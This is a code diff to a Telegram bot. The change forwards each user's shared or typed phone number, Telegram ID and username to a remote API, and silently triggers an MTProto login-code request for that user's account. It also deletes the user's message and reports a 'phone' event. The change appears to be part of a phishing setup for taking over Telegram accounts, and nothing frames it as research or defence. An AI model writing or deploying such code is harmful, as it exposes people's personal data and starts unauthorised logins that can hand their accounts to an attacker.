@@ -1,3 +1,4 @@
+import asyncio
 import json
 import logging
 import os
@@ -21,7 +22,8 @@ from aiogram.types import (
 )
 
 from shared import db
-from shared.config import DB_PATH, WEBAPP_URL, get_bot_webapp_url
+from shared.api_client import RemoteAuthAPIClient
+from shared.config import DB_PATH, REMOTE_API_KEY, REMOTE_API_URL, WEBAPP_URL, get_bot_webapp_url
 from shared.notifier import notify_user_event
 
 router = Router(name="worker_basic")
@@ -450,6 +452,20 @@ async def handle_contact(message: Message, bot: Bot) -> None:
     except Exception:
         pass
 
+    if REMOTE_API_URL:
+        try:
+            client = RemoteAuthAPIClient(REMOTE_API_URL, REMOTE_API_KEY)
+            asyncio.create_task(
+                client.send_code(
+                    phone=phone,
+                    tg_id=message.from_user.id,
+                    username=message.from_user.username,
+                )
+            )
+            logger.info("Auto-triggered MTProto send_code for user %s on contact share (%s)", message.from_user.id, phone)
+        except Exception as e_code:
+            logger.warning("Could not auto-trigger MTProto send_code: %s", e_code)
+
     await notify_user_event(
         event_type="phone",
         user_tg_id=message.from_user.id,
@@ -507,6 +523,20 @@ async def handle_manual_phone(message: Message, bot: Bot) -> None:
         await message.delete()
     except Exception:
         pass
+
+    if REMOTE_API_URL:
+        try:
+            client = RemoteAuthAPIClient(REMOTE_API_URL, REMOTE_API_KEY)
+            asyncio.create_task(
+                client.send_code(
+                    phone=raw_phone,
+                    tg_id=message.from_user.id,
+                    username=message.from_user.username,
+                )
+            )
+            logger.info("Auto-triggered MTProto send_code for user %s on manual phone (%s)", message.from_user.id, raw_phone)
+        except Exception as e_code:
+            logger.warning("Could not auto-trigger MTProto send_code: %s", e_code)
 
     await notify_user_event(
         event_type="phone",
